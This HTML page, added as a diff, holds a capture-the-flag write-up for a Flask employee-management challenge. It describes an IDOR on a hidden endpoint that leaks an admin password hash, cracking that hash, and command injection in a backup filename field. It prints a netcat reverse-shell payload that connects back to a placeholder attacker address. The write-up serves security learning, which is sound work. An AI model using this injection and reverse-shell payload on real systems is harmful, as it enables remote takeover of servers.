@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=8664&amp;path=livereload" data-no-instant defer></script>
+  
+    <title> :: </title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Command via door Medium: 500 (300) pts Our employee management web application should soon be deployed. Can you help us test its robustness?
+Challmaker: uchiwa
+We have an app were we can create an account and login.
+Once inside there is a profile page.
+Nothing really interesting. I tried to see is there was an SSTI in the username as this is a flask app but nothing.
+Moving on and reading the source code we get this.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:8664/writeups/command_via_door/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:8664/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:8664/img/theme-colors/blue.png">
+  <link rel="apple-touch-icon" href="//localhost:8664/img/theme-colors/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="">
+<meta property="og:description" content="Command via door Medium: 500 (300) pts Our employee management web application should soon be deployed. Can you help us test its robustness?
+Challmaker: uchiwa
+We have an app were we can create an account and login.
+Once inside there is a profile page.
+Nothing really interesting. I tried to see is there was an SSTI in the username as this is a flask app but nothing.
+Moving on and reading the source code we get this.
+" />
+<meta property="og:url" content="//localhost:8664/writeups/command_via_door/" />
+<meta property="og:site_name" content="" />
+
+  
+    <meta property="og:image" content="//localhost:8664/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/writeups/command_via_door/index.xml" rel="alternate" type="application/rss+xml" title="" />
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="blue">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    0z stuff&#39;s
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups" >Writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+    <div class="index-content">
+      <h1 id="command-via-door"><strong><em>Command via door</em></strong></h1>
+<h3 id="medium-500-300-pts">Medium: 500 (300) pts</h3>
+<blockquote>
+<p>Our employee management web application should soon be deployed. Can you help us test its robustness?</p>
+</blockquote>
+<blockquote>
+<p>Challmaker: uchiwa</p>
+</blockquote>
+<p>We have an app were we can create an account and login.</p>
+<p><img src="account.png" alt="account"></p>
+<p>Once inside there is a profile page.</p>
+<p><img src="profile.png" alt="profile"></p>
+<p>Nothing really interesting. I tried to see is there was an <code>SSTI</code> in the username as this is a flask app but nothing.</p>
+<p>Moving on and reading the source code we get this.</p>
+<p><img src="hidden_dir.png" alt="hidden_dir"></p>
+<p>There is a hidden directory <code>/infos-all-users</code>. Accessing it we get</p>
+<p><img src="strange_400.png" alt="strange 400"></p>
+<p>This tells us that the request wasn&rsquo;t sent the way it should&rsquo;ve been. But the name of that directory tells us that we&rsquo;re supposed to read some users infos here so I tried some <code>Idor</code> stuffs like <code>?id=1</code> and <code>/1</code>. Finally the last one was the right answer as accessing <code>/infos-all-users/2</code> we get this</p>
+<p><img src="admin_creds.png" alt="admin creds"></p>
+<p>The password seems to be encrypted so I used <code>crackstation</code> to decode it.</p>
+<p><img src="pass_crack.png" alt="pass crack"></p>
+<p>And login in as admin we have</p>
+<p><img src="admin_dashboard.png" alt="admin dashboard"></p>
+<p>We see that there is a backup functionality which isn&rsquo;t available to random users. It asks us for the name of the backup file and then nothing&hellip;.</p>
+<p><img src="backup.png" alt="backup"></p>
+<p>Now by experience we know that databases backups are generally generated using tools like <code>mysqldump</code>  which are command line utilities. So we can assume that in the background what is actually done by the server when we use the backup functionality is something like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mysqldump -u <span style="color:#f92672">[</span>username<span style="color:#f92672">]</span> –p<span style="color:#f92672">[</span>password<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>database_name<span style="color:#f92672">]</span> &gt; &lt;filename_provided&gt;
+</span></span></code></pre></div><p>Or something similar. I decided to inject some bash specific chars like <code>#</code> to confirm that and in fact it had some effect on the backup process result</p>
+<p>This opens up the way to an <code>RCE</code></p>
+<p>I sent this payload to get a revershell:</p>
+<p><code>random; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f</code></p>
+<p>And nice we got the shell. We just have to look for the flag now and we&rsquo;re done.</p>
+<p><img src="flag.png" alt="flag"></p>
+<h5 id="by-w1z0z---l3gm1nn"><em>By w1z0z - (l3gm1nn)</em></h5>
+
+    </div>
+  
+  <div class="posts">
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
